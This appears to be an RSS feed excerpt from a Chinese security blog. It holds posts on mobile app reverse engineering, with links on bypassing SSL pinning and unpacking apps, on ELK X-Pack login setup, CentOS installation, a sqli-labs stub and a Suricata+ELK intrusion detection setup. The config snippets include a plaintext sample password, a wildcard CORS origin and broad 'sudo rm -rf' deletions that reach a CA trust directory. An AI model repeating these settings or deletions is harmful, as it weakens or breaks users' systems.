总结</h1><p>头秃的三天终于结束了！！只是一个记录小白逆向app的心酸过程，总结三点如下：</p><p>（1）逆向低版本app，这个真的是太重要了</p><p>（2） 安卓模拟器运行app失败后，最好用Android7.0以下进行测试。</p><p>（ 3）要有一个强大的内心和一直转的脑子<del>搞不动了可以换换方向，说不定柳暗花明又一村呢</del>···</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>1 <a href="https://www.cnblogs.com/magicalpig/p/12671559.html">部分APP使用burpsuite抓不到包原因</a>    </p><p>2 <a href="https://zhuanlan.zhihu.com/p/58204817">证书锁定SSL Pinning简介及用途</a>  </p><p>3 <a href="https://crifan.github.io/app_capture_package_tool_charles/website/appendix/reference.html"> 破解https的SSL Pinning</a>   很详细</p><p>4 <a href="https://www.cnblogs.com/mysticbinary/p/11609825.html">Androidkiller反汇编失败的解决方案</a>  能不用就不用，太复杂啦</p><p>5 <a href="http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/">证书格式互转</a>  很nice 虽然我没用到</p><p>6 <a href="https://www.jianshu.com/p/dbe579f6cc84">脱壳工具FDex2</a>   很详细  但是 Amaze 文件管理器下载打开失败，尝试用<a href="https://blog.csdn.net/weixin_36001685/article/details/101020843">total conmander</a>成功</p><p>7 <a href="https://blog.csdn.net/qq_41855420/article/details/106276824">利用反射大师超详细脱壳教程</a>   很nice，</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</category>
      
      
      <comments>https://m01ly.github.io/2020/09/18/mobilesecurity-experience/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>elk笔记二--通过X-Pack权限控制设置elk登录</title>
      <link>https://m01ly.github.io/2020/09/11/elk-login/</link>
      <guid>https://m01ly.github.io/2020/09/11/elk-login/</guid>
      <pubDate>Fri, 11 Sep 2020 09:59:18 GMT</pubDate>
      
      <description>&lt;p&gt; 给ES和kibana设置用户登陆，或者使用nginx限制IP或用户访问。本文介绍ELK自带的创建用户的方式。 首先贴了张网上的图可以看到ELK架构使用图。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> 给ES和kibana设置用户登陆，或者使用nginx限制IP或用户访问。本文介绍ELK自带的创建用户的方式。 首先贴了张网上的图可以看到ELK架构使用图。<a id="more"></a></p><p><img src="https://images2018.cnblogs.com/blog/790307/201803/790307-20180313090706209-1391916396.jpg" alt="img"></p><h1 id="1-修改ES配置开启X-PACK"><a href="#1-修改ES配置开启X-PACK" class="headerlink" title="1 修改ES配置开启X-PACK"></a>1 修改ES配置开启X-PACK</h1><p>修改配置文件elasticsearch.yml内容如下：</p><p>ELK菜鸟手记 (三) - X-Pack权限控制之给Kibana加上登录控制以及index_not_found_exception问题解决</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vi /etc/elasticsearch/elasticsearch.yml</span>http.cors.enabled: <span class="token boolean">true</span>http.cors.allow-origin: <span class="token string">"*"</span>http.cors.allow-headers: Authorizationxpack.security.enabled: <span class="token boolean">true</span>xpack.security.transport.ssl.enabled: <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/elk-login/1603957755321.png" alt="1603957755321"></p><p>重启ES：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl restart elasticsearch</span><span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl status elasticsearch</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="2-创建用户"><a href="#2-创建用户" class="headerlink" title="2 创建用户"></a>2 创建用户</h1><p>输入下列命令后，一次输入各个账户的密码：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd /usr/share/elasticsearch</span><span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># bin/elasticsearch-setup-passwords interactive</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>内置账户的含义：<br> elastic内置超级用户。请参阅内置角色。<br> kibana用户Kibana用于连接Elasticsearch并与之通信。<br> logstash_system:Logstash用户在Elasticsearch中存储监视信息时使用。<br> beats_system:eats在Elasticsearch中存储监控信息时使用的用户。<br> apm_system:APM服务器在Elasticsearch中存储监视信息时使用的用户。<br> remote_monitoring_user:Metricbeat用户在Elasticsearch中收集和存储监控信息时使用。它具有remote_monitoring_agent和 remote_monitoring_collector内置的角色。</p><p><img src="/2020/09/11/elk-login/1603958077193.png" alt="1603958077193"></p><h1 id="3-修改Kibana配置"><a href="#3-修改Kibana配置" class="headerlink" title="3 修改Kibana配置"></a>3 修改Kibana配置</h1><p>vi /etc/kibana/kibana.yml </p><pre class="line-numbers language-bash"><code class="language-bash">elasticsearch.username: <span class="token string">"kibana_system"</span>elasticsearch.password: <span class="token string">"kibana*2020"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>重启Kibana</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl restart kibana</span><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl status kibana</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="4-修改logstash配置"><a href="#4-修改logstash配置" class="headerlink" title="4  修改logstash配置"></a>4  修改logstash配置</h1><p>3  配置logstash</p><p>vi /etc/logstash/conf.d/logstash.conf</p><p><img src="/2020/09/11/elk-login/1603959501523.png" alt="1603959501523"></p><p>重启logstash</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="5登录"><a href="#5登录" class="headerlink" title="5登录"></a>5登录</h1><h2 id="5-1-登陆elasticsearch"><a href="#5-1-登陆elasticsearch" class="headerlink" title="5.1 登陆elasticsearch"></a>5.1 登陆elasticsearch</h2><p><img src="/2020/09/11/elk-login/1603959003797.png" alt="1603959003797"></p><h2 id="5-2-登陆kibana使用elasticsearch"><a href="#5-2-登陆kibana使用elasticsearch" class="headerlink" title="5.2 登陆kibana使用elasticsearch"></a>5.2 登陆kibana使用elasticsearch</h2><p>输入用户名：elastic和logstash.conf中的密码，</p><p><img src="/2020/09/11/elk-login/1603958930073.png" alt="1603958930073"></p><p><img src="/2020/09/11/elk-login/1603974376447.png" alt="1603974376447"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/wsdc0521/article/details/106344974">ELK系列(九)、配置ES和Kibana的用户密码</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/">日志管理</category>
      
      
      <comments>https://m01ly.github.io/2020/09/11/elk-login/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>vm 安装centos 7教程详解</title>
      <link>https://m01ly.github.io/2020/09/11/install-guide-centosInvm/</link>
      <guid>https://m01ly.github.io/2020/09/11/install-guide-centosInvm/</guid>
      <pubDate>Fri, 11 Sep 2020 09:59:18 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;1-前期准备&quot;&gt;&lt;a href=&quot;#1-前期准备&quot; class=&quot;headerlink&quot; title=&quot;1 前期准备&quot;&gt;&lt;/a&gt;1 前期准备&lt;/h1&gt;&lt;p&gt;1）VMware虚拟机&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;centos镜像，我用的是centos7&lt;/li&gt;
&lt;/ol&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1 前期准备"></a>1 前期准备</h1><p>1）VMware虚拟机</p><ol start="2"><li>centos镜像，我用的是centos7</li></ol><a id="more"></a><p>官网下载地址：</p><p> <a href="http://isoredirect.centos.org/centos/">http://isoredirect.centos.org/centos/</a> 或者 <a href="http://apache.apooloo.cn/#/down/b6cfbd0dfda13a7f46125288e8ea8831">http://apache.apooloo.cn/#/down/b6cfbd0dfda13a7f46125288e8ea8831</a> </p><p><img src="/2020/09/11/install-guide-centosInvm/1603246800490.png" alt="1603246800490"></p><h1 id="2-新建虚拟机"><a href="#2-新建虚拟机" class="headerlink" title="2 新建虚拟机"></a>2 新建虚拟机</h1><p>（1）新建虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603246938246.png" alt="1603246938246"></p><p>（2）选择自定义虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603246969975.png" alt="1603246969975"></p><p>（3）兼容性选择</p><p>选择当前虚拟机版本就可，尽量选择高版本，因为高版本虚拟机可以兼容低版本创建的虚拟机。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247049675.png" alt="1603247049675"></p><p>（4）</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247121052.png" alt="1603247121052"></p><p>（5） 选择Linux的centos7,根据自己下载的镜像属性来选择</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247200778.png" alt="1603247200778"></p><p>（6）填写虚拟机名称和虚拟机所在位置</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247257115.png" alt="1603247257115"></p><p>（7）根据自己需求分配处理器和内核数量，因为有的软件安装需要双核的，因此我选了1个处理器，双核。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247301706.png" alt="1603247301706"></p><p>（8）我宿主机是8G的，给虚拟机分配了2G，1G内存会很卡，建议条件允许下分配2G。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247443067.png" alt="1603247443067"></p><p>（9）网络连接类型的选择，网络连接类型一共有桥接、NAT、仅主机和不联网四种。</p><p>桥接：选择桥接模式的话虚拟机和宿主机在网络上就是平级的关系，相当于连接在同一交换机上。</p><p>NAT：NAT模式就是虚拟机要联网得先通过宿主机才能和外面进行通信。</p><p>仅主机：虚拟机与宿主机直接连起来</p><p>桥接与NAT模式访问互联网过程，如下图所示</p><p><img src="https://img-blog.csdn.net/20180711224004659?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><p>这里选择NAT模式：</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249663181.png" alt="1603249663181"></p><p>（10）默认SCSI控制器即可，然后一直默认往下</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247594330.png" alt="1603247594330"></p><p>（11）创建新的虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247633971.png" alt="1603247633971"></p><p>（12）分配磁盘，新手建议选择单个磁盘即可，满足需求又方便</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247698163.png" alt="1603247698163"></p><p>（13）取消不需要的硬件，若不需要，可以移除声卡等硬件</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247759405.png" alt="1603247759405"></p><p>（14）完成配置</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247816395.png" alt="1603247816395"></p><h1 id="3-安装配置centos"><a href="#3-安装配置centos" class="headerlink" title="3 安装配置centos"></a>3 安装配置centos</h1><p>（1）导入centos镜像，选中创建的虚拟机，右击，选择设置</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247903884.png" alt="1603247903884"></p><p>选择CD/DVD，然后使用ISO映像文件，导入官网下载的iso镜像，然后选择确定。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248005710.png" alt="1603248005710"></p><p>（2） 开启虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248058638.png" alt="1603248058638"></p><p>（3）开启虚拟机后会出现以下界面</p><ol><li>Install CentOS 7 安装CentOS 7</li><li>Test this media &amp; install CentOS 7 测试安装文件并安装CentOS 7</li><li>Troubleshooting 修复故障</li></ol><p>选择第一项，安装直接CentOS 7，回车，进入下面的界面</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248982709.png" alt="1603248982709"></p><p>（4）选择语言， 英文、键盘选择美式键盘 ,点击continue</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248188656.png" alt="1603248188656"></p><p>(5)进入设置面板，首先设置时间，点击进行DATE&amp;TIME</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248238624.png" alt="1603248238624"></p><p>选择Asia区域，城市为上海，调节时间和日期如下，然后选择左上角的done</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248344446.png" alt="1603248344446"></p><p>（6）返回设置面板后，选择需要安装的软件;</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248414811.png" alt="1603248414811"></p><p>为了后面的虚拟机使用方便，选择了图像化界面，然后选择了几个组件，点击左上角done即可，如下：</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248586590.png" alt="1603248586590"></p><p>（7）返回面板，进行磁盘划分</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248642104.png" alt="1603248642104"></p><p>因为我们开始设置的是单个磁盘，这里直接选择默认的即可，点击done。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248690126.png" alt="1603248690126"></p><p>（8）返回设置面板，设置主机名和网卡信息</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248829613.png" alt="1603248829613"></p><p>首先设置网卡，打开，看到IP地址（看不到IP地址的应该是选择了桥接模式，前面一定要选择NAT模式），然后输入主机名，点击Apply，设置完成后，点击左上角DOne。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603250501053.png" alt="1603250501053"></p><p>（9）回到设置面板，点击右下角的begin installation，开始安装</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248731326.png" alt="1603248731326"></p><p>（10）设置root密码：</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249251084.png" alt="1603249251084"></p><p><img src="/2020/09/11/install-guide-centosInvm/1603249273725.png" alt="1603249273725"></p><p>（11）还可以设置管理员用户</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249382172.png" alt="1603249382172"></p><p>输入相关用户名密码，点击左上角done即可。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249407944.png" alt="1603249407944"></p><p>等待系统安装完毕重启系统即可。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249729806.png" alt="1603249729806"></p><h1 id="4-常见网络配置"><a href="#4-常见网络配置" class="headerlink" title="4 常见网络配置"></a>4 常见网络配置</h1><p>REF：</p><p><a href="https://blog.csdn.net/babyxue/article/details/80970526">超级详细的安装教程</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/">安装教程</category>
      
      
      <comments>https://m01ly.github.io/2020/09/11/install-guide-centosInvm/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>writeup-sqli-labs</title>
      <link>https://m01ly.github.io/2020/09/11/writeup-sqli-labs/</link>
      <guid>https://m01ly.github.io/2020/09/11/writeup-sqli-labs/</guid>
      <pubDate>Fri, 11 Sep 2020 09:59:18 GMT</pubDate>
      
      <description>&lt;p&gt;待完善&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>待完善</p><a id="more"></a><h1 id="1-sqli-labs安装"><a href="#1-sqli-labs安装" class="headerlink" title="1 sqli-labs安装"></a>1 sqli-labs安装</h1><p>因为XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。这个软件包原来的名字是 LAMPP，但是为了避免误解，最新的几个版本就改名为 XAMPP 了。它可以在Windows、<a href="https://baike.baidu.com/item/Linux">Linux</a>、Solaris、Mac OS X 等多种操作系统下安装使用。</p><p>因此我是打算在windows平台安装 XAMPP即可运行sqli-labs，下载地址如下：</p><p><a href="https://www.apachefriends.org/zh_cn/download.html">https://www.apachefriends.org/zh_cn/download.html</a></p><p>启动xampp,start Apache,无法启动的可能是相关端口占用，解决办法如下：</p><p><a href="https://blog.csdn.net/caizhigui/article/details/50332995">https://blog.csdn.net/caizhigui/article/details/50332995</a></p><p>sqli-labs源码地址：</p><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E9%9D%B6%E5%9C%BAwriteup/">靶场writeup</category>
      
      
      <comments>https://m01ly.github.io/2020/09/11/writeup-sqli-labs/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>elk笔记一---suricata+elk搭建入侵检测系统</title>
      <link>https://m01ly.github.io/2020/09/11/install-guide-elk-suricata/</link>
      <guid>https://m01ly.github.io/2020/09/11/install-guide-elk-suricata/</guid>
      <pubDate>Fri, 11 Sep 2020 09:59:18 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;1-引言&quot;&gt;&lt;a href=&quot;#1-引言&quot; class=&quot;headerlink&quot; title=&quot;1 引言&quot;&gt;&lt;/a&gt;1 引言&lt;/h1&gt;&lt;p&gt;最近有一个工作任务，需要利用Suricata作为IDS来检测出口流量，同时利用ELK进行数据的展示。看了很多suricata+elk进行流量监测的文章，但是都不太符合要求。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1 引言"></a>1 引言</h1><p>最近有一个工作任务，需要利用Suricata作为IDS来检测出口流量，同时利用ELK进行数据的展示。看了很多suricata+elk进行流量监测的文章，但是都不太符合要求。</p><a id="more"></a><h1 id="2-部署架构"><a href="#2-部署架构" class="headerlink" title="2 部署架构"></a>2 部署架构</h1><p>整个架构如下表所示，有台机器装suricata用于分析流量，并装elk负责数据展示，后面数据量太大可能涉及elk集群，这里先不做考虑，仅仅自己实验。</p><table><thead><tr><th>机器</th><th>部署内容</th><th>IP</th></tr></thead><tbody><tr><td>流量分析和数据展示机器，称之为ids主机</td><td>ELK数据展示+suricata分析流量</td><td>多个集群</td></tr><tr><td>流量收集集群</td><td>抓取集群流量</td><td>10.0.0.1</td></tr></tbody></table><p>这个架构我们提供两种流量分析模式。</p><p>一种为在线模式：正常做法都是利用镜像流量，将所有集群抓取到的流量镜像到suricata机器，suricata实时在线处理这些流量,再elk展示出来。</p><p>二离线模式：但是因为机器是部署在阿里云上的，因此做镜像流量较困难，当然采用Amazon VPC功能可以实现镜像流量，如<a href="https://aws.amazon.com/cn/blogs/china/using-vpc-traffic-mirroring-to-construct-network-intrusion-detection-system-update/"> VPC Traffic Mirroring 构建网络入侵检测系统</a>文章，这里我们没有购买此产品，初步架构部署为离线模式。即流量收集集群将抓取的流量文件推送到suricata主机上，suricata -r分析流量文件包，产生log日志，然后elk将log数据展示出来。</p><p><img src="/2020/09/11/install-guide-elk-suricata/1611038936479.png" alt="1611038936479"></p><h1 id="3-环境部署"><a href="#3-环境部署" class="headerlink" title="3 环境部署"></a>3 环境部署</h1><h2 id="3-1-suricata部署"><a href="#3-1-suricata部署" class="headerlink" title="3.1 suricata部署"></a>3.1 suricata部署</h2><p>suricata的安装教程看<a href="https://m01ly.github.io/2020/09/11/install-guide-suricata/">前文</a>，安装好suricata后，然后按照<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/_Logstash_Kibana_and_Suricata_JSON_output">官网suricata+elk部署指南</a>配置相关支持Elk属性即可。</p><h3 id="3-1-1-确认suricata安装了libjansson"><a href="#3-1-1-确认suricata安装了libjansson" class="headerlink" title="3.1.1 确认suricata安装了libjansson"></a>3.1.1 确认suricata安装了libjansson</h3><p>如下查看配置信息，确认  libjansson support:为yes即可</p><pre class="line-numbers language-bash"><code class="language-bash">$ suricata --build-infoThis is Suricata version 2.0 RELEASEFeatures: NFQ PCAP_SET_BUFF LIBPCAP_VERSION_MAJOR<span class="token operator">=</span>1 AF_PACKET HAVE_PACKET_FANOUT LIBCAP_NG LIBNET1.1 HAVE_HTP_URI_NORMALIZE_HOOK HAVE_NSS HAVE_LIBJANSSON <span class="token punctuation">..</span>.  libnss support:                          <span class="token function">yes</span>  libnspr support:                         <span class="token function">yes</span>  libjansson support:                     --<span class="token operator">></span> <span class="token function">yes</span> <span class="token operator">&lt;</span>--  Prelude support:                         no  PCRE jit:                                no  libluajit:                               no  libgeoip:                                <span class="token function">yes</span>  Non-bundled htp:                         <span class="token function">yes</span>  Old barnyard2 support:                   no  CUDA enabled:                            no<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-2-修改配置文件"><a href="#3-1-2-修改配置文件" class="headerlink" title="3.1.2  修改配置文件"></a>3.1.2  修改配置文件</h3><p>修改配置文件suricata.yaml如下</p><pre class="line-numbers language-yaml"><code class="language-yaml">  <span class="token comment" spellcheck="true"># "United" event log in JSON format</span>  <span class="token punctuation">-</span> <span class="token key atrule">eve-log</span><span class="token punctuation">:</span>      <span class="token key atrule">enabled</span><span class="token punctuation">:</span> yes      <span class="token key atrule">type</span><span class="token punctuation">:</span> file <span class="token comment" spellcheck="true">#file|syslog|unix_dgram|unix_stream</span>      <span class="token key atrule">filename</span><span class="token punctuation">:</span> eve.json      <span class="token comment" spellcheck="true"># the following are valid when type: syslog above</span>      <span class="token comment" spellcheck="true">#identity: "suricata" </span>      <span class="token comment" spellcheck="true">#facility: local5</span>      <span class="token comment" spellcheck="true">#level: Info ## possible levels: Emergency, Alert, Critical,</span>                   <span class="token comment" spellcheck="true">## Error, Warning, Notice, Info, Debug</span>      <span class="token key atrule">types</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> alert        <span class="token punctuation">-</span> <span class="token key atrule">http</span><span class="token punctuation">:</span>            <span class="token key atrule">extended</span><span class="token punctuation">:</span> yes     <span class="token comment" spellcheck="true"># enable this for extended logging information</span>        <span class="token punctuation">-</span> dns        <span class="token punctuation">-</span> <span class="token key atrule">tls</span><span class="token punctuation">:</span>            <span class="token key atrule">extended</span><span class="token punctuation">:</span> yes     <span class="token comment" spellcheck="true"># enable this for extended logging information</span>        <span class="token punctuation">-</span> <span class="token key atrule">files</span><span class="token punctuation">:</span>            <span class="token key atrule">force-magic</span><span class="token punctuation">:</span> yes   <span class="token comment" spellcheck="true"># force logging magic on all logged files</span>            <span class="token key atrule">force-md5</span><span class="token punctuation">:</span> yes     <span class="token comment" spellcheck="true"># force logging of md5 checksums</span>        <span class="token comment" spellcheck="true">#- drop</span>        <span class="token punctuation">-</span> ssh        <span class="token punctuation">-</span> smtp        <span class="token punctuation">-</span> flow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-安装ES"><a href="#3-2-安装ES" class="headerlink" title="3.2 安装ES"></a>3.2 安装ES</h2><h3 id="3-2-1-需要java-1-8-环境"><a href="#3-2-1-需要java-1-8-环境" class="headerlink" title="3.2.1 需要java 1.8 环境"></a>3.2.1 需要java 1.8 环境</h3><p>ES安装需要java1.8环境，因此需要先检查主机是否有java1.8环境。</p><p> <a href="http://www.justdojava.com/2019/08/11/elk-install/">http://www.justdojava.com/2019/08/11/elk-install/</a> </p><p><img src="/2020/09/11/install-guide-elk-suricata/1603867131448.png" alt="1603867131448"></p><p>（1）查看java版本：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">which</span> java<span class="token function">whereis</span> javajava -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603862442212.png" alt="1603862442212"></p><p>（2）卸载旧版本（这里注意centos7自带的是1.8的jre，需要卸载掉/或者yum -y install java-1.8.0-openjdk安装的也仅仅是jre）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find / -name java</span>/etc/pki/ca-trust/extracted/java/etc/pki/java/etc/alternatives/java/etc/java/var/lib/alternatives/java/usr/bin/java/usr/lib/java/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java/usr/share/elasticsearch/jdk/bin/java/usr/share/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/ca-trust/extracted/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/elasticsearch/jdk/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）安装1.8版本java</p><p>执行下面命令进行安装1.8jdk。这里有个地方要注意，要选择 要带有-devel的安装，因为这个安装的是jdk，而那个不带-devel的安装完了其实是jre。 </p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> -y java-1.8.0-openjdk-devel.x86_64java -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603870468396.png" alt="1603870468396"></p><p>（4）修改环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span class="token comment" spellcheck="true">#修改JAVA_HOME为jdk目录</span><span class="token keyword">echo</span> <span class="token variable">$JAVA_HOME</span><span class="token comment" spellcheck="true">#查看环境变量</span>/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603868088313.png" alt="1603868088313"></p><p> 让profile文件立即生效 ，1.8java安装成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  source /etc/profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603867783946.png" alt="1603867783946"></p><h3 id="3-2-2安装"><a href="#3-2-2安装" class="headerlink" title="3.2.2安装"></a>3.2.2安装</h3><p><a href="https://www.elastic.co/cn/downloads/elasticsearch">官网下载</a></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.0-x86_64.rpmrpm -ivh elasticsearch-7.8.0-x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603803405841.png" alt="1603803405841"></p><p>安装目录： 一般是装在/usr/share/elasticsearch/下。 </p><p>报错1：</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603866798862.png" alt="1603866798862"></p><p>解决办法：删除其他版本的java</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> / -name java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603866831066.png" alt="1603866831066"></p><p>版本太低 ，都删除，</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> -rf /opt/jdk1.7.0_79/<span class="token function">sudo</span> <span class="token function">rm</span> -rf /opt/jdk1.8.0_60/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-3设置data的目录"><a href="#3-2-3设置data的目录" class="headerlink" title="3.2.3设置data的目录"></a>3.2.3设置data的目录</h3><p>创建/data/es-data目录，用于elasticsearch数据的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /data/es-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为elasticsearch</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R 